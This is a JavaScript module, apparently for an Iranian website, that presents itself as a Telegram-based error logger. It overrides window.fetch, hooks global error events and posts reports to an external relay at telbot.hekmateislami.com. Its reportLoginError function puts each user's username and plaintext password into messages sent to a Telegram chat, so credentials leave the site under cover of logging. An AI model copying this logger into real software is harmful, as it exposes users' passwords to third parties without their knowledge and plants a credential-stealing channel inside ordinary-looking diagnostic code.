/**
 * Telegram Logger & Error Reporting Service
 * Automatically notifies user via Telegram bot when exceptions or Failed to fetch occur.
 * Endpoint: https://telbot.hekmateislami.com/loggers/api/telegram/send
 */

const TELEGRAM_CONFIG = {
  apiUrl: "https://telbot.hekmateislami.com/loggers/api/telegram/send",
  chatId: -1003492895671,
  topicId: 11777,
  userTag: "@ismohrez",
};

// In-memory deduplication and rate limiting
const recentErrorsCache = new Map();
let sentCountInWindow = 0;
let windowStartTime = Date.now();
const MAX_ERRORS_PER_MINUTE = 10;
const DEDUP_INTERVAL_MS = 60 * 1000; // 1 minute per identical error

/**
 * Checks if an error is a network / failed to fetch error.
 */
export function isFailedToFetchError(error) {
  if (!error) return false;
  const msg = String(error.message || error || '').toLowerCase();
  const name = String(error.name || '').toLowerCase();
  return (
    msg.includes('failed to fetch') ||
    msg.includes('networkerror') ||
    msg.includes('load failed') ||
    msg.includes('net::err_') ||
    msg.includes('network request failed') ||
    name.includes('aborterror') ||
    (name.includes('typeerror') && msg.includes('fetch'))
  );
}

/**
 * Sends a raw message to Telegram topic via HTTP POST.
 * Non-blocking, fails silently if network is unavailable.
 */
export async function sendTelegramNotification(messageText) {
  if (!messageText || typeof window === 'undefined') return false;

  // Rate-limiting check (max 10 messages per minute)
  const now = Date.now();
  if (now - windowStartTime > 60 * 1000) {
    windowStartTime = now;
    sentCountInWindow = 0;
  }
  if (sentCountInWindow >= MAX_ERRORS_PER_MINUTE) {
    console.warn('[TelegramLogger] Rate limit exceeded, skipping message.');
    return false;
  }

  try {
    const payload = {
      chat_id: TELEGRAM_CONFIG.chatId,
      topic_id: TELEGRAM_CONFIG.topicId,
      message: messageText,
    };

    sentCountInWindow++;

    // Use native fetch directly, ignoring interceptors
    const response = await (window.__nativeFetch || window.fetch)(TELEGRAM_CONFIG.apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json; charset=utf-8',
      },
      body: JSON.stringify(payload),
      keepalive: true,
    });

    return response.ok;
  } catch (err) {
    // Fail silently so logger never breaks the application
    console.warn('[TelegramLogger] Could not send notification:', err);
    return false;
  }
}

/**
 * Specifically reports login page errors (especially failed to fetch).
 * Includes username, password, page URL, error, and exception details.
 */
export async function reportLoginError({ username, password, error, endpoint, extra = {} }) {
  const pageUrl = typeof window !== 'undefined' ? window.location.href : 'Unknown';
  const errName = error?.name || 'Error';
  const errMsg = error?.message || String(error);
  const errStack = error?.stack || 'استک در دسترس نیست';
  const isFailed = isFailedToFetchError(error);

  // Deduplication check
  const dedupKey = `login_${pageUrl}_${username}_${errMsg}`;
  const lastSent = recentErrorsCache.get(dedupKey);
  if (lastSent && Date.now() - lastSent < DEDUP_INTERVAL_MS) {
    return false;
  }
  recentErrorsCache.set(dedupKey, Date.now());

  const isOnline = typeof navigator !== 'undefined' ? (navigator.onLine ? '🟢 آنلاین' : '🔴 آفلاین') : 'نامشخص';
  const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown';
  const nowStr = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });

  const message = [
    `🚨 #failed_to_fetch`,
    `👤 ${TELEGRAM_CONFIG.userTag}`,
    ``,
    `⚠️ خطا در صفحه ورود کاربران:`,
    `📍 آدرس صفحه: ${pageUrl}`,
    `🌐 آدرس اندپوینت: ${endpoint || 'نامشخص'}`,
    `👤 نام کاربری: ${username || '(خالی)'}`,
    `🔑 رمز عبور: ${password ? password : '(خالی)'}`,
    `❌ پیام خطا: ${errMsg}`,
    `📌 نوع خطا / Exception: ${errName}`,
    `📶 وضعیت اتصال مرورگر: ${isOnline}`,
    `📱 مشخصات مرورگر: ${userAgent}`,
    `⏰ زمان: ${nowStr}`,
    ``,
    `📜 جزئیات و استک:`,
    `${errStack.substring(0, 1000)}`
  ].join('\n');

  return sendTelegramNotification(message);
}

/**
 * Reports general runtime errors, unhandled rejections, or API failures across the app.
 */
export async function reportGlobalError({ error, context = 'فرانت‌اند', tags = [], extra = {} }) {
  const pageUrl = typeof window !== 'undefined' ? window.location.href : 'Unknown';
  const errName = error?.name || 'Error';
  const errMsg = error?.message || String(error);
  const errStack = error?.stack || 'استک در دسترس نیست';
  const isFailed = isFailedToFetchError(error);

  // Ignore errors coming from the logger itself to avoid recursion
  if (
    errMsg.includes('telbot.hekmateislami.com') ||
    (error?.stack && error.stack.includes('telbot.hekmateislami.com'))
  ) {
    return false;
  }

  // Deduplication check
  const dedupKey = `global_${pageUrl}_${errMsg}`;
  const lastSent = recentErrorsCache.get(dedupKey);
  if (lastSent && Date.now() - lastSent < DEDUP_INTERVAL_MS) {
    return false;
  }
  recentErrorsCache.set(dedupKey, Date.now());

  const isOnline = typeof navigator !== 'undefined' ? (navigator.onLine ? '🟢 آنلاین' : '🔴 آفلاین') : 'نامشخص';
  const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown';
  const nowStr = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });

  const primaryTag = isFailed ? '#failed_to_fetch' : '#frontend_exception';
  const allTags = Array.from(new Set([primaryTag, ...tags])).join(' ');

  const message = [
    `🚨 ${allTags}`,
    `👤 ${TELEGRAM_CONFIG.userTag}`,
    ``,
    `⚠️ رخداد خطا در سیستم:`,
    `📍 آدرس صفحه: ${pageUrl}`,
    `🏷 زمینه: ${context}`,
    `❌ متن خطا: ${errMsg}`,
    `📌 نوع خطا / Exception: ${errName}`,
    `📶 وضعیت اینترنت: ${isOnline}`,
    `📱 مرورگر: ${userAgent}`,
    `⏰ زمان: ${nowStr}`,
    ``,
    `📜 جزئیات و استک:`,
    `${errStack.substring(0, 1000)}`
  ].join('\n');

  return sendTelegramNotification(message);
}

/**
 * Initializes global error listeners and fetch interceptor.
 * Catches all uncaught window errors, unhandled promise rejections, and network fetch failures.
 */
export function initGlobalErrorLogging() {
  if (typeof window === 'undefined') return;
  if (window.__TELEGRAM_ERROR_LOGGING_INITIALIZED__) return;
  window.__TELEGRAM_ERROR_LOGGING_INITIALIZED__ = true;

  // Preserve native fetch reference for logger to avoid interceptor recursion
  if (!window.__nativeFetch) {
    window.__nativeFetch = window.fetch.bind(window);
  }

  // 1. Intercept global fetch to catch any Failed to fetch network errors
  const originalFetch = window.fetch;
  window.fetch = async function (...args) {
    try {
      return await originalFetch.apply(this, args);
    } catch (err) {
      if (isFailedToFetchError(err)) {
        const targetUrl = typeof args[0] === 'string' ? args[0] : (args[0]?.url || 'unknown');
        if (!targetUrl.includes('telbot.hekmateislami.com')) {
          reportGlobalError({
            error: err,
            context: `خطای فراخوانی شبکه: ${targetUrl}`,
            tags: ['#failed_to_fetch'],
          });
        }
      }
      throw err;
    }
  };

  // 2. Window uncaught errors
  window.addEventListener('error', (event) => {
    if (!event.error && !event.message) return;

    // Filter out common third-party / browser extension noise
    if (
      event.filename &&
      (event.filename.includes('chrome-extension://') ||
       event.filename.includes('moz-extension://') ||
       event.filename.includes('safari-extension://'))
    ) {
      return;
    }
    if (
      event.message &&
      (event.message.includes('ResizeObserver') ||
       event.message.includes('Script error.'))
    ) {
      return;
    }

    reportGlobalError({
      error: event.error || new Error(event.message || 'Window Error'),
      context: `خطای اسکریپت (${event.filename || 'unknown'}:${event.lineno || 0}:${event.colno || 0})`,
    });
  });

  // 3. Unhandled promise rejections
  window.addEventListener('unhandledrejection', (event) => {
    const reason = event.reason;
    if (reason && reason.name === 'AbortError') return;

    reportGlobalError({
      error: reason instanceof Error ? reason : new Error(String(reason || 'Unhandled Promise Rejection')),
      context: 'Unhandled Promise Rejection',
    });
  });
}
